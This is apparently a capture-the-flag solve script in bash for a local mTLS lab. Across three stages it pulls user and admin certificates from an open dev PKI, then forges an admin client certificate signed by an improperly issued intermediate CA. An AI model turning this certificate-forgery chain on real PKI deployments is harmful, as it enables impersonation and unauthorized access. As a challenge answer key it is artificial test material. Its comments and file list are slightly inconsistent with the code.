#!/bin/bash

# mTLS Challenge Solve Script
# Solves all three stages of the challenge

# Configurable URLs (can be overridden with environment variables)
if [ -f Source/.env ]; then
    source Source/.env
fi
PROD_PKI_URL=${PROD_PKI_URL:-"http://localhost:8090"}
DEV_PKI_URL=${DEV_PKI_URL:-"http://localhost:8091"}
NGINX_URL=${NGINX_URL:-"https://localhost:8443"}

echo "🔐 mTLS Challenge Solve Script"
echo "================================"
echo "Using URLs:"
echo "  Prod PKI: $PROD_PKI_URL"
echo "  Dev PKI:  $DEV_PKI_URL"
echo "  Nginx:    $NGINX_URL"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if services are running
check_services() {
    print_status "Checking if services are running..."
    
    if ! curl -s $PROD_PKI_URL/health > /dev/null; then
        print_error "Prod PKI not accessible at $PROD_PKI_URL"
        exit 1
    fi
    
    if ! curl -s $DEV_PKI_URL/health > /dev/null; then
        print_error "Dev PKI not accessible at $DEV_PKI_URL"
        exit 1
    fi
    
    print_success "All services are running"
}

# Stage 1: Basic Exploitation
solve_stage1() {
    echo ""
    print_status "Stage 1: Basic Exploitation"
    echo "--------------------------------"
    
    print_status "Getting user certificate from prod PKI..."
    curl -s "$PROD_PKI_URL/issue?username=user" > user_cert.pem
    if [ $? -eq 0 ]; then
        print_success "User certificate obtained"
    else
        print_error "Failed to get user certificate"
        return 1
    fi
    
    print_status "Accessing /user endpoint..."
    USER_FLAG=$(curl -s -k --cert user_cert.pem --key user_cert.pem $NGINX_URL/user)
    if [ $? -eq 0 ]; then
        print_success "User flag: $USER_FLAG"
    else
        print_error "Failed to access /user endpoint"
        return 1
    fi
}

solve_stage2() {
    echo ""
    print_status "Stage 2: Dev PKI Exploitation"
    echo "--------------------------------"

    print_status "Getting admin certificate from dev PKI..."
    curl -s "$DEV_PKI_URL/issue?username=admin" > admin_cert.pem
    if [ $? -eq 0 ]; then
        print_success "Admin certificate obtained"
    else
        print_error "Failed to get admin certificate"
        return 1
    fi
    
    print_status "Accessing /admin endpoint..."
    ADMIN_FLAG=$(curl -s -k --cert admin_cert.pem --key admin_cert.pem $NGINX_URL/admin)
    if [ $? -eq 0 ]; then
        print_success "Admin flag: $ADMIN_FLAG"
    else
        print_error "Failed to access /admin endpoint"
        return 1
    fi
}

# Stage 2: Certificate Chaining
solve_stage3() {
    echo ""
    print_status "Stage 3: Certificate Chaining"
    echo "-----------------------------------"
    
    print_status "Getting intermediate CA certificate from dev PKI..."
    curl -s "$DEV_PKI_URL/issue-ca?username=attacker" > intermediate_ca.pem
    if [ $? -eq 0 ]; then
        print_success "Intermediate CA certificate obtained"
    else
        print_error "Failed to get intermediate CA certificate"
        return 1
    fi
    
    print_status "Extracting intermediate CA key and certificate..."
    # Extract the private key (first part)
    head -n 27 intermediate_ca.pem > intermediate_ca.key
    # Extract the certificate (second part)
    tail -n +28 intermediate_ca.pem > intermediate_ca.crt
    
    print_success "Intermediate CA components extracted"
    
    print_status "Creating certificate signed by intermediate CA using OpenSSL..."
    
    # Create a new private key for the user certificate
    openssl genrsa -out user_key.pem 2048
    
    # Create a certificate signing request (CSR)
    openssl req -new -key user_key.pem -out user.csr -subj "/CN=admin"
    
    # Create a certificate signed by the intermediate CA
    openssl x509 -req -in user.csr -CA intermediate_ca.crt -CAkey intermediate_ca.key \
        -CAcreateserial -out user_cert.pem -days 365 -sha256
    
    # Combine the private key, user certificate, and intermediate CA certificate for mTLS
    cat user_key.pem user_cert.pem intermediate_ca.crt > chained_cert.pem
    
    print_success "Chained certificate created using OpenSSL"
    
    print_status "Validating certificate chain..."
    openssl verify -CAfile intermediate_ca.crt user_cert.pem
    if [ $? -eq 0 ]; then
        print_success "Certificate chain validation successful"
    else
        print_warning "Certificate chain validation failed, but continuing..."
    fi
    
    print_status "Certificate details:"
    openssl x509 -in user_cert.pem -text -noout | grep -E "(Subject:|Issuer:|CN=)"
    
    print_status "Accessing /advanced endpoint with chained certificate..."
    ADVANCED_FLAG=$(curl -s -k --cert chained_cert.pem --key chained_cert.pem $NGINX_URL/advanced)
    if [ $? -eq 0 ]; then
        print_success "Advanced flag: $ADVANCED_FLAG"
    else
        print_error "Failed to access /advanced endpoint"
        return 1
    fi
}


# Main execution
main() {
    echo "Starting mTLS challenge solve script..."
    
    check_services
    
    # Solve Stage 1
    solve_stage1
    if [ $? -ne 0 ]; then
        print_error "Stage 1 failed"
        exit 1
    fi
    
    # Solve Stage 2
    solve_stage2
    if [ $? -ne 0 ]; then
        print_error "Stage 2 failed"
        exit 1
    fi
    
    # Solve Stage 3 (demonstration)
    solve_stage3
    
    echo ""
    print_success "Challenge solve script completed!"
    print_status "Generated files:"
    echo "  - user_cert.pem (Stage 1)"
    echo "  - admin_cert.pem (Stage 1)"
    echo "  - intermediate_ca.pem (Stage 2)"
    echo "  - chained_cert.pem (Stage 2)"
    echo "  - admin_public_key.pem (Stage 3)"
}

# Run the script
main "$@" 